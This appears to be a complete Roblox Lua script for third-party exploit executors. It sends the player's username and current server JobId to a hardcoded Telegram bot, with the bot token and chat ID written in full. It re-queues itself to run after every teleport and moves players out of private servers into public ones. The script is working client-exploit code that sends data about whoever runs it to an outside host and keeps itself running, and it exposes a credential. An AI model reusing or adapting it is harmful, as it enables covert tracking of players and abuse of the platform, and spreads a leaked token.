local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

local PLACE_ID = 126884695634066
local TELEGRAM_URL = "https://api.telegram.org/bot8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4/sendMessage"
local TELEGRAM_CHAT_ID = "2001061743"

local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request

-- Function to send Telegram log
local function sendTelegramLog(reason)
    if not requestFunc then return end
    local message = string.format("JobId: %s\nReason: %s\nUsername: %s", game.JobId, reason, LocalPlayer.Name)
    pcall(function()
        requestFunc({
            Url = TELEGRAM_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({chat_id = TELEGRAM_CHAT_ID, text = message})
        })
    end)
end

-- Queue script to run after teleport
if syn and syn.queue_on_teleport then
    syn.queue_on_teleport(script.Source)
elseif queue_on_teleport then
    queue_on_teleport(script.Source)
end

-- Send JobId for current server
sendTelegramLog("Current server")

-- Only hop if in a private server
if game.PrivateServerId and game.PrivateServerId ~= "" then
    -- Get public servers list
    local serversJson = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..PLACE_ID.."/servers/Public?sortOrder=Asc&limit=100"))
    for _, server in ipairs(serversJson.data) do
        if server.playing < server.maxPlayers and server.id ~= game.JobId then
            TeleportService:TeleportToPlaceInstance(PLACE_ID, server.id, {LocalPlayer})
            break
        end
    end
else
    print("Already in a public server, not hopping.")
end
